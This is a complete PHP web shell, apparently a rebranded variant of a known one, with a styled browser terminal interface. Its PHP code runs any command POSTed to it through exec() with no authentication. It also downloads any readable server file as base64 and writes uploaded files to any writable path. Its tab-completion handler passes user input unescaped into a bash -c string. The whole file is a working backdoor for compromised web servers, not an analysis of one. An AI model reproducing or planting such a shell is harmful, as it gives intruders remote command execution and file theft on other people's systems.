<?php

function featureyaw($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", yaw_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "yaw":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureyaw($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>ʞooꟽ ʅɐɾꓤ</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #yaw {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #yaw-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #yaw-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            @media (max-width: 991px) {
                #yaw-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }

                html, body, #yaw {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #yaw {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #yaw-input {
                    flex-direction: column;
                }
            }

            @media (max-width: 320px) {
                #yaw-logo {
                    font-size: 5px;
                }
            }

            .yaw-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .yaw-prompt > span {
                color: #1BC9E7;
            }

            #yaw-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #yaw-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #yaw-input #yaw-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #yaw-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #yaw-input input {
                outline: none;
            }
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eyawCmdInput = null;
            var eyawContent = null;

            function _insertCommand(command) {
                eyawContent.innerHTML += "\n\n";
                eyawContent.innerHTML += '<span class=\"yaw-prompt\">' + genPrompt(CWD) + '</span> ';
                eyawContent.innerHTML += escapeHtml(command);
                eyawContent.innerHTML += "\n";
                eyawContent.scrollTop = eyawContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eyawContent.innerHTML += escapeHtml(stdout);
                eyawContent.scrollTop = eyawContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureyaw(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend yaw TERM environment variable not set. Clear command history from UI but keep in buffer
                    eyawContent.innerHTML = '';
                } else {
                    makeRequest("?feature=yaw", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                }
            }

            function featureHint() {
                if (eyawCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eyawCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eyawCmdInput.value;
                            eyawCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eyawCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eyawCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "🅜🅡@🅨🅐🅦🅨🅐🅦~#<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eyawPrompt = document.getElementById("yaw-prompt");
                eyawPrompt.innerHTML = genPrompt(CWD);
            }

            function _onyawCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureyaw(eyawCmdInput.value);
                        insertToHistory(eyawCmdInput.value);
                        eyawCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eyawCmdInput.blur();
                            eyawCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eyawCmdInput.focus();
                            });
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eyawCmdInput.value = "";
                        } else {
                            eyawCmdInput.blur();
                            eyawCmdInput.focus();
                            eyawCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eyawCmdInput.focus();
                }
            };

            window.onload = function() {
                eyawCmdInput = document.getElementById("yaw-cmd");
                eyawContent = document.getElementById("yaw-content");
                updateCwd();
                eyawCmdInput.focus();
            };
        </script>
    </head>

    <body>
        <div id="yaw">
            <pre id="yaw-content">
                <div id="yaw-logo">

M""MMMM""M   🅼🆁 🅈🄰🅆🅈🄰🅆   MM'""""'YMM M"""""`'"""`YM M""""""'YMM <span></span>
M. `MM' .M                     M' .mmm. `M M  mm.  mm.  M M  mmmm. `M <span></span>
MM.    .MM .d8888b. dP  dP  dP M  MMMMMooM M  MMM  MMM  M M  MMMMM  M <span></span>
MMMb  dMMM 88'  `88 88  88  88 M  MMMMMMMM M  MMM  MMM  M M  MMMMM  M <span></span>
MMMM  MMMM 88.  .88 88.88b.88' M. `MMM' .M M  MMM  MMM  M M  MMMM' .M <span></span>
MMMM  MMMM `88888P8 8888P Y8P  MM.     .dM M  MMM  MMM  M M       .MM <span></span>
MMMMMMMMMM                     MMMMMMMMMMM MMMMMMMMMMMMMM MMMMMMMMMMM <span></span>

                </div>
            </pre>
            <div id="yaw-input">
                <label for="yaw-cmd" id="yaw-prompt" class="yaw-prompt">???</label>
                <div>
                    <input id="yaw-cmd" name="cmd" onkeydown="_onyawCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
